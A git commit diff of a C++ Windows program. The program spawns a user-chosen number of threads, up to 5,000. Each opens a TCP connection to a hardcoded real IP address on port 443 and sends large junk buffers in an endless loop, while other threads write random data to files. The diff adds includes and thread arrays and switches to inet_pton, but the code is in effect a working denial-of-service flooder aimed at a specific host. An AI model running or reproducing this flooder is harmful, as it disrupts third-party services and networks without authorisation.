e6537b6ba688338afdd2063da93cab8100f65339
DDEEII <153964184+DDEEII@users.noreply.github.com>
2024-05-30 07:16:18 +0800

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -1,11 +1,14 @@
 #include <bits/stdc++.h>
 #include "winsock2.h"
+#include <Ws2tcpip.h>
 #include <windows.h>
 #include <random>
 #include <fstream>
-#pragma comment(dll,"ws2_32.dll")
+#include<thread>
+#pragma comment(lib,"ws2_32.lib")
 using namespace std;
 //#define int long long
+std::thread mythread[5000], ctcp[5000];
 int numthread = 400;
 
 void show(int i) {
@@ -23,8 +26,7 @@ void show(int i) {
 			f << distrib(engine);
 		}
 	}
-}
-void tcp(int i) {
+}void tcp(int i) {
 	WSADATA wsaData;
 	char buff[1024];
 	memset(buff, 0, sizeof(buff));
@@ -37,19 +39,20 @@ void tcp(int i) {
 	SOCKADDR_IN addrSrv;
 	addrSrv.sin_family = AF_INET;
 	addrSrv.sin_port = htons(443);
-	addrSrv.sin_addr.S_un.S_addr = inet_addr("124.205.120.153");
-
+	//addrSrv.sin_addr.S_un.S_addr = inet_addr("124.205.120.153");
+	inet_pton(AF_INET, "124.205.120.153", &addrSrv.sin_addr.s_addr);
 	SOCKET sockClient = socket(AF_INET, SOCK_STREAM, 0);
 
 	if (SOCKET_ERROR == sockClient) {
 		//printf("Socket() error:%d", WSAGetLastError());
-		return ;
+		return;
 	}
 
-	if (connect(sockClient, (struct  sockaddr *)&addrSrv, sizeof(addrSrv)) == INVALID_SOCKET) {
+	if (connect(sockClient, (struct  sockaddr*)&addrSrv, sizeof(addrSrv)) == INVALID_SOCKET) {
 		//printf("杩炴帴澶辫触:%d", WSAGetLastError());
 		return;
-	} else {
+	}
+	else {
 		recv(sockClient, buff, sizeof(buff), 0);
 	}
 
@@ -59,16 +62,15 @@ void tcp(int i) {
 	for (int i = 0; i < 10000; i++)
 		buffs[i] = 'c';
 
-	while (true) {
+	while(1){
 		send(sockClient, buffs, sizeof(buffs), 0);
 	}
 }
-signed main(int argc, char *argv[]){
-	if(argc!=2)cout<<"error thread number";
-	numthread=atoi(argv[1]);
+signed main(int argc, char* argv[]) {
+	if (argc != 2)cout << "error thread number";
+	numthread = atoi(argv[1]);
 	
-	thread mythread[numthread], ctcp[numthread];
-	Sleep(1000);
+	//Sleep(1000);
 
 	for (int i = 0; i < numthread; i++) {
 		mythread[i] = thread(show, i);
